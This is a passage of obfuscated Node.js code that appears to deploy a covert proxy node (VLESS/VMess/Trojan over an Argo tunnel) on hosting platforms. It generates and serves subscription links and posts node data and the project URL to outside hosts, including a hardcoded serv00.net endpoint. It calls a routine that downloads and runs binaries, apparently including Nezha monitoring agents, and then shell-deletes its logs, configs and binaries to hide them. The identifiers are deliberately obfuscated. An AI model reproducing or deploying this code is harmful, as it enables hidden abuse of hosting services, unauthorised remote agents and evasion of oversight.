_0x2ceda6(_0x2e47fd){const _0x3f9de2={_0x217994:0x252,_0x205019:0x1f6,_0x351d88:0x2a4,_0x4bfa97:0x221,_0x45c8fc:0x2ab,_0x472228:0x22f,_0x1353b8:0x2b1,_0x28f1fe:0x22e,_0x28f6ee:0x29f,_0x714ad4:0x262,_0x257f2a:0x2b7},_0xf6f27=await _0x16af05(),_0x4b21c7=NAME?NAME+'-'+_0xf6f27:_0xf6f27;return new Promise(_0x5b1c1a=>{const _0x23dbf4={_0x124232:0x262,_0x290586:0x211};setTimeout(()=>{const _0x4be776=_0x3e04,_0x569859={'v':'2','ps':''+_0x4b21c7,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x4be776(_0x3f9de2._0x217994),'net':'ws','type':'none','host':_0x2e47fd,'path':_0x4be776(_0x3f9de2._0x205019),'tls':_0x4be776(0x23c),'sni':_0x2e47fd,'alpn':'','fp':_0x4be776(_0x3f9de2._0x351d88)},_0x243e15=_0x4be776(_0x3f9de2._0x4bfa97)+UUID+'@'+CFIP+':'+CFPORT+_0x4be776(_0x3f9de2._0x45c8fc)+_0x2e47fd+'&fp=firefox&type=ws&host='+_0x2e47fd+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x4b21c7+_0x4be776(0x244)+Buffer[_0x4be776(0x29f)](JSON[_0x4be776(0x200)](_0x569859))[_0x4be776(0x262)](_0x4be776(_0x3f9de2._0x472228))+_0x4be776(0x20b)+UUID+'@'+CFIP+':'+CFPORT+_0x4be776(0x21b)+_0x2e47fd+_0x4be776(0x261)+_0x2e47fd+_0x4be776(0x294)+_0x4b21c7+_0x4be776(_0x3f9de2._0x1353b8);console[_0x4be776(_0x3f9de2._0x28f1fe)](Buffer[_0x4be776(0x29f)](_0x243e15)[_0x4be776(0x262)]('base64')),fs[_0x4be776(0x257)](subPath,Buffer[_0x4be776(_0x3f9de2._0x28f6ee)](_0x243e15)[_0x4be776(_0x3f9de2._0x714ad4)]('base64')),console[_0x4be776(0x22e)](FILE_PATH+_0x4be776(_0x3f9de2._0x257f2a)),uploadNodes(),app[_0x4be776(0x203)]('/'+SUB_PATH,(_0x52ccc2,_0x1e5b97)=>{const _0x4864ef=_0x4be776,_0x12dcad=Buffer['from'](_0x243e15)[_0x4864ef(_0x23dbf4._0x124232)]('base64');_0x1e5b97[_0x4864ef(_0x23dbf4._0x290586)](_0x4864ef(0x255),'text/plain;\x20charset=utf-8'),_0x1e5b97[_0x4864ef(0x25f)](_0x12dcad);}),_0x5b1c1a(_0x243e15);},0x7d0);});}}async function uploadNodes(){const _0x5c8a78={_0x2f3f8e:0x280,_0x567feb:0x235,_0x1859ab:0x2ac,_0x4f8836:0x28f,_0x4b8795:0x2a8},_0x944629=_0x4a4676;if(UPLOAD_URL&&PROJECT_URL){const _0x1dc9ee=PROJECT_URL+'/'+SUB_PATH,_0x5f313c={'subscription':[_0x1dc9ee]};try{const _0x4466af=await axios[_0x944629(0x29d)](UPLOAD_URL+'/api/add-subscriptions',_0x5f313c,{'headers':{'Content-Type':_0x944629(_0x5c8a78._0x2f3f8e)}});return _0x4466af&&_0x4466af['status']===0xc8?(console[_0x944629(0x22e)](_0x944629(0x285)),_0x4466af):null;}catch(_0x339164){if(_0x339164['response']){if(_0x339164[_0x944629(_0x5c8a78._0x567feb)][_0x944629(0x20d)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x944629(_0x5c8a78._0x1859ab)](listPath))return;const _0x16fe15=fs['readFileSync'](listPath,_0x944629(0x2ba)),_0x4d230c=_0x16fe15[_0x944629(_0x5c8a78._0x4f8836)]('\x0a')[_0x944629(0x230)](_0x4766cc=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x944629(0x234)](_0x4766cc));if(_0x4d230c['length']===0x0)return;const _0x2a4bf6=JSON['stringify']({'nodes':_0x4d230c});try{const _0x24c743=await axios[_0x944629(0x29d)](UPLOAD_URL+'/api/add-nodes',_0x2a4bf6,{'headers':{'Content-Type':_0x944629(0x280)}});return _0x24c743&&_0x24c743['status']===0xc8?(console[_0x944629(0x22e)](_0x944629(_0x5c8a78._0x4b8795)),_0x24c743):null;}catch(_0x3ca6cd){return null;}}else return;}}function cleanFiles(){const _0x711f5b={_0x1f3efb:0x2be,_0x560312:0x25b,_0x5b4e83:0x270,_0x5d8f82:0x274,_0x2a068b:0x28a},_0xcebac6={_0x2346eb:0x1fe,_0x2d5344:0x25a},_0x5a3125={_0x17b354:0x1fe,_0x49102b:0x22e};setTimeout(()=>{const _0x41c7b6=_0x3e04,_0x1acafa=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1acafa['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1acafa[_0x41c7b6(0x275)](phpPath);process[_0x41c7b6(_0x711f5b._0x1f3efb)]===_0x41c7b6(_0x711f5b._0x560312)?exec(_0x41c7b6(_0x711f5b._0x5b4e83)+_0x1acafa[_0x41c7b6(0x22c)]('\x20')+'\x20>\x20nul\x202>&1',_0x43a646=>{const _0x12a76c=_0x41c7b6;console[_0x12a76c(_0x5a3125._0x17b354)](),console[_0x12a76c(_0x5a3125._0x49102b)](_0x12a76c(0x23f)),console[_0x12a76c(0x22e)](_0x12a76c(0x25a));}):exec(_0x41c7b6(_0x711f5b._0x5d8f82)+_0x1acafa[_0x41c7b6(0x22c)]('\x20')+_0x41c7b6(_0x711f5b._0x2a068b),_0x36fed3=>{const _0x26cc1a=_0x41c7b6;console[_0x26cc1a(_0xcebac6._0x2346eb)](),console[_0x26cc1a(0x22e)]('App\x20is\x20running'),console[_0x26cc1a(0x22e)](_0x26cc1a(_0xcebac6._0x2d5344));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x3d3a3c={_0x5d84f5:0x271,_0x3dfbf1:0x26f,_0x1d87cc:0x240},_0x16718f=_0x4a4676;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x16718f(0x22e)](_0x16718f(0x278));return;}try{const _0x547090=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x16718f(0x280)}});return console[_0x16718f(0x22e)](_0x16718f(_0x3d3a3c._0x5d84f5)),_0x547090;}catch(_0x32f9ae){return console[_0x16718f(_0x3d3a3c._0x3dfbf1)](_0x16718f(0x243)+_0x32f9ae[_0x16718f(_0x3d3a3c._0x1d87cc)]),null;}}async function startserver(){const _0x2e474d={_0x476064:0x272},_0x322bf4=_0x4a4676;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x58348b){console[_0x322bf4(0x26f)](_0x322bf4(_0x2e474d._0x476064),_0x58348b);}}startserver()[_0x4a4676(0x251)](_0x1275ec=>{const _0x3fa8bb=_0x4a4676;console['error'](_0x3fa8bb(0x231),_0x1275ec);}),app['listen'](PORT,()=>console[_0x4a4676(0x22e)](_0x4a4676(0x206)+PORT+'!'));
